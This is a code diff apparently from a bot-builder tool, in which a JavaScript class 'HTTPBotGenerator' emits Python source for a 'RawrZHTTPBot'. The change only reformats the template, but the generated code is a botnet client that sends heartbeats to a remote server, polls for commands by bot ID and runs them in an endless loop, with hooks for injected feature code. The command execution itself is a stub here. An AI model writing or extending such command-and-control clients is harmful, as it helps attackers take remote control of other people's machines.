@@ -325,57 +325,57 @@ class HTTPBotGenerator {
             '        ' + featureCode.init + '\n' +
             '        \n' +
             '        # Main bot loop\n' +
-        while self.is_running:
-            try:
-                # Send heartbeat
-                self.send_heartbeat()
-                
-                # Check for commands
-                command = self.receive_command()
-                if command:
-                    self.execute_command(command)
-                
-                # Execute features
-                ${featureCode.execute}
-                
-                time.sleep(5)
-            except Exception as e:
-                print(f"Error: {e}")
-                time.sleep(10)
-    
-    def send_heartbeat(self):
-        data = {
-            'bot_id': self.bot_id,
-            'status': 'alive',
-            'timestamp': int(time.time())
-        }
-        self.send_http_request('/bot/heartbeat', data)
-    
-    def receive_command(self):
-        response = self.send_http_request(f'/bot/commands/{self.bot_id}', {})
-        return response
-    
-    def execute_command(self, command):
-        print(f"Executing command: {command}")
-        # Command execution logic here
-    
-    def send_http_request(self, endpoint, data):
-        try:
-            url = self.server_url + endpoint
-            if data:
-                response = requests.post(url, json=data, timeout=10)
-            else:
-                response = requests.get(url, timeout=10)
-            return response.text
-        except Exception as e:
-            print(f"HTTP request failed: {e}")
-            return ""
-    
-    " + featureCode.methods + "
-
-if __name__ == "__main__":
-    bot = RawrZHTTPBot()
-    bot.run()`;
+            '        while self.is_running:\n' +
+            '            try:\n' +
+            '                # Send heartbeat\n' +
+            '                self.send_heartbeat()\n' +
+            '                \n' +
+            '                # Check for commands\n' +
+            '                command = self.receive_command()\n' +
+            '                if command:\n' +
+            '                    self.execute_command(command)\n' +
+            '                \n' +
+            '                # Execute features\n' +
+            '                ' + featureCode.execute + '\n' +
+            '                \n' +
+            '                time.sleep(5)\n' +
+            '            except Exception as e:\n' +
+            '                print(f"Error: {e}")\n' +
+            '                time.sleep(10)\n' +
+            '    \n' +
+            '    def send_heartbeat(self):\n' +
+            '        data = {\n' +
+            '            \'bot_id\': self.bot_id,\n' +
+            '            \'status\': \'alive\',\n' +
+            '            \'timestamp\': int(time.time())\n' +
+            '        }\n' +
+            '        self.send_http_request(\'/bot/heartbeat\', data)\n' +
+            '    \n' +
+            '    def receive_command(self):\n' +
+            '        response = self.send_http_request(f\'/bot/commands/{self.bot_id}\', {})\n' +
+            '        return response\n' +
+            '    \n' +
+            '    def execute_command(self, command):\n' +
+            '        print(f"Executing command: {command}")\n' +
+            '        # Command execution logic here\n' +
+            '    \n' +
+            '    def send_http_request(self, endpoint, data):\n' +
+            '        try:\n' +
+            '            url = self.server_url + endpoint\n' +
+            '            if data:\n' +
+            '                response = requests.post(url, json=data, timeout=10)\n' +
+            '            else:\n' +
+            '                response = requests.get(url, timeout=10)\n' +
+            '            return response.text\n' +
+            '        except Exception as e:\n' +
+            '            print(f"HTTP request failed: {e}")\n' +
+            '            return ""\n' +
+            '    \n' +
+            '    ' + featureCode.methods + '\n' +
+            '\n' +
+            'if __name__ == "__main__":\n' +
+            '    bot = RawrZHTTPBot()\n' +
+            '    bot.run()';
     }
 
     generatePythonFeatures(features) {
